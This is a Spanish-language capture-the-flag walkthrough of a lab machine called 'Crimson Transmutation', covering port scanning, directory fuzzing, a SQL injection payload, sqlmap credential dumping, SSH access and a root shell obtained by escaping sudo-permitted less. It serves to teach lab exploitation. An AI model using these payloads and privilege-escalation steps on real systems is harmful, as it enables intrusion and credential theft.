# Crimson Transmutation

## 1. Introducción

### 1.1 Antecedentes

Crimson Transmutation es una máquina enfocada en el desarrollo de habilidades de **enumeración, explotación web y escalada de privilegios en entornos Linux**.

El escenario presenta un sistema web con un catálogo antiguo (legacy) vulnerable, lo que permite la explotación mediante **SQL Injection**, seguido de la obtención de credenciales y escalada de privilegios mediante una configuración insegura de `sudo`.

---

### 1.2 Objetivos

- Enumerar servicios expuestos en la máquina objetivo  
- Identificar vulnerabilidades en la aplicación web  
- Explotar una SQL Injection para obtener credenciales  
- Obtener acceso inicial mediante SSH  
- Escalar privilegios hasta root  

---

## 2. Enumeración

### 2.1 Nmap

Se realiza un escaneo completo de puertos:

```bash
sudo nmap -p- -Pn -sS -n --min-rate 5000 192.168.56.104 -oN allports --open
```
Resultados:

```
PORT   STATE SERVICE
22/tcp openssh
80/tcp open  http
```

Se identifican dos vectores principales:

- **SSH (22)** → Posible acceso remoto
- **HTTP (80)** → Vector principal de ataque

---

### 2.2 Web

Al acceder al servicio web se observa un portal llamado:

**Central State Archive**

El sitio indica el uso de sistemas antiguos:

> "Legacy catalog systems are still online for compatibility."
> 

Esto sugiere posibles vulnerabilidades en componentes legacy.

### 2.3 Fuzzing
```
ffuf -u http:<ip>/FUZZ -w /opt/seclists/Discovery/Web-Content/common.txt
```
Se realiza fuzzing y se encuentra el archivo `robots.txt`:

```
User-agent: *
Disallow: /catalog/
Disallow: /logs/
```

- `/logs/` → No relevante (ruido)
- `/catalog/` → Contiene un sistema de búsqueda

---

## 3. Explotación

### 3.1 SQL Injection

Dentro de `/catalog/` se encuentra un panel de búsqueda vulnerable.

Se prueba el payload:

```
' OR 1=1-- -
```

El sistema devuelve todos los registros, confirmando una **SQL Injection**.

---

### 3.2 Enumeración con SQLMap

Se automatiza la explotación con sqlmap.

### Listar bases de datos

```
sqlmap -u "http://192.168.56.104/catalog/search.php?q=test" --batch --dbs
```

Resultado:

```
available databases [2]:
[*] crimson_db
[*] information_schema
```

---

### 3.3 Enumeración de tablas

```
sqlmap -u "http://192.168.56.104/catalog/search.php?q=test" -D crimson_db --tables --batch
```

Resultado:

```
Database: crimson_db

[2 tables]
+-------------------+
| edward_records    |
| researchers       |
+-------------------+
```

---

### 3.4 Dump de credenciales

```
sqlmap -u "http://192.168.56.104/catalog/search.php?q=test" -D crimson_db -T edward_records --dump --batch
```

Se obtienen credenciales:

```
edward : alchemy123
```

---

### 3.5 Acceso inicial (SSH)

```
ssh edward@192.168.56.104
```

Dentro del sistema:

```
ls
```

```
research_notes.txt  user.txt
```

Contenido relevante:

```
The old archive search should have been retired months ago.

I told Al to move the binding study drafts out of my home directory.
He said he stored the final copy somewhere safer, but root still keeps the master archive.
```

---

### 3.6 Movimiento lateral

Se listan archivos ocultos:

```
ls -la
```

Se encuentra:

```
.alphonse
```

Este archivo contiene credenciales del usuario **alphonse**.

Se accede:

```
su alphonse
```

---

## 4. Post-explotación

### 4.1 Escalada de privilegios

Se revisan permisos:

```
sudo -l
```

Resultado:

```
User alphonse may run the following commands on Crimson-Transmutation:
    (ALL) NOPASSWD: /usr/bin/less /etc/crimson-maintenance.log
```

---

### 4.2 Explotación de less

Se ejecuta:

```
sudo /usr/bin/less /etc/crimson-maintenance.log
```

Dentro de `less`:

```
!/bin/bash
```

---

### 4.3 Root

```
whoami
```

```
root
```
